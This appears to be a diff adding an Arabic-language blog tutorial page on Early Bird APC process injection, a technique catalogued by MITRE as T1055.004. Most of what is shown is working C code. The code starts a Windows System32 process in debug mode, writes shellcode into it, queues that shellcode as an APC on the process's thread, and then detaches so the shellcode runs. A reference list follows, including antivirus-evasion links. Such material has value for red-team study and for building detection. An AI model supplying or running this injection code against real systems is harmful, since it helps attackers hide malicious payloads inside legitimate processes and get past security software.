+                                &nbsp;&nbsp;STARTUPINFO	Si = { 0 };<br>
+                                &nbsp;&nbsp;PROCESS_INFORMATION	Pi = { 0 };<br><br>
+                            
+                                &nbsp;&nbsp;RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));<br>
+                                &nbsp;&nbsp;RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));<br><br>
+                            
+                                &nbsp;&nbsp;Si.cb = sizeof(STARTUPINFO);<br><br>
+                                
+                                &nbsp;&nbsp;if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                            
+                                    &nbsp;&nbsp;sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);<br>
+                                    &nbsp;&nbsp;printf("\n[i] Running : \"%s\" ... ", lpPath);<br>
+                            
+                                    &nbsp;&nbsp;if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                            
+                                        &nbsp;&nbsp;printf("[+] DONE \n");<br><br>
+                            
+                                        &nbsp;&nbsp;*dwProcessId = Pi.dwProcessId;<br>
+                                        &nbsp;&nbsp;*hProcess = Pi.hProcess;<br>
+                                        &nbsp;&nbsp;*hThread = Pi.hThread;<br><br>
+                            
+                                        &nbsp;&nbsp;if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return TRUE;<br><br>
+                                
+                                        &nbsp;&nbsp;return FALSE;<br>
+                            }<br><br>
+                            
+                            int main() {<br><br>
+                                
+                                &nbsp;&nbsp;HANDLE	hProcess = NULL, hThread = NULL;<br>
+                                &nbsp;&nbsp;DWORD dwProcessId = NULL;<br>
+                                &nbsp;&nbsp;PVOID pAddress = NULL;<br><br>
+                            
+                                &nbsp;&nbsp;printf("[i] Creating \"%s\" Process as a Debugged Process ... \n", TARGET_PROCESS);<br><br>
+                            
+                                &nbsp;&nbsp;if (!CreateDebuggedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;printf("[i] Target Process Created With Pid : %d \n", dwProcessId);<br>
+                                    &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
+                            
+                                    &nbsp;&nbsp;printf("[i] Injecting Shellcode to the Target Process ... \n");<br>
+                                    &nbsp;&nbsp;if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                        &nbsp;&nbsp;}<br>
+                                        &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
+                            
+                            
+                                        &nbsp;&nbsp;QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);<br><br>
+                            
+                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Run the Shellcode ... \n");<br>
+                                        &nbsp;&nbsp;getchar();<br><br>
+                            
+                                        &nbsp;&nbsp;DebugActiveProcessStop(dwProcessId);<br><br>
+                            
+                                        &nbsp;&nbsp;printf("[+] DONE \n\n");<br><br>
+                            
+                                        &nbsp;&nbsp;CloseHandle(hProcess);<br>
+                                        &nbsp;&nbsp;CloseHandle(hThread);<br><br>
+                            
+                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ... \n");<br>
+                                        &nbsp;&nbsp;getchar();<br><br>
+                            
+                                        &nbsp;&nbsp;return 0;<br>
+                            }<br>
+                    </code>
+                </div>
+
+                <p style="border-top: 2px solid #FFD700;"></p>
+                <p style="border-top: 2px solid #FFD700;"></p>
+                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
+                    متترددش وكلمني.<br>
+                    وابقي إدعيلي عشان داخل الجيش الفتره الجاية .. مصصصصر محتاجاني :(</p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                <h2>References</h2>
+                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>
+
+                <ul style="direction: ltr;">
+                    <li><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls"
+                            target="_blank" class="download-link">Asynchronous Procedure Calls</a>
+
+                    <li><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/asynchronous-procedure-call"
+                            target="_blank" class="download-link">Asynchronous Procedure Call</a></li>
+
+                    <li><a href="https://attack.mitre.org/techniques/T1055/004/" target="_blank"
+                            class="download-link">Process Injection: Asynchronous Procedure Call</a></li>
+
+                    <li><a href="https://aliongreen.github.io/posts/apc-injection.html" target="_blank"
+                            class="download-link">Process Injection: APC Injection</a></li>
+
+                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection"
+                            target="_blank" class="download-link">APC Queue Code Injection</a></li>
+
+                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection"
+                            target="_blank" class="download-link">Early Bird APC Queue Code Injection</a></li>
+
+                    <li><a href="https://github.com/Faran-17/EarlyBird-APC-Injection" target="_blank"
+                            class="download-link">EarlyBird-APC-Injection Code</a></li>
+
+                    <li><a href="https://chrollo-dll.gitbook.io/chrollo/security-blogs/malware-development-and-ttps/early-bird-apc-injection-t1055.004"
+                            target="_blank" class="download-link">Early Bird APC Injection - T1055.004</a></li>
+
+
+                    <li><a href="https://www.linkedin.com/pulse/av-evasion-early-bird-code-injection-ralph-el-khoury/"
+                            target="_blank" class="download-link">Evasion with Early Bird Injection</a></li>
+
+                </ul>
+            </div>
+            <div class="nav-buttons">
+                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next →</a>
+                <a href="./Shellcode-Injection.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
+            </div>
+    </section>
+    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
+        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
+    </footer>
+
+    <script src="../src/JS/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
+    <script>
+        window.onload = function () {
+            AOS.init({ offset: 0 });
+        };
+    </script>
+    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+
+</html>
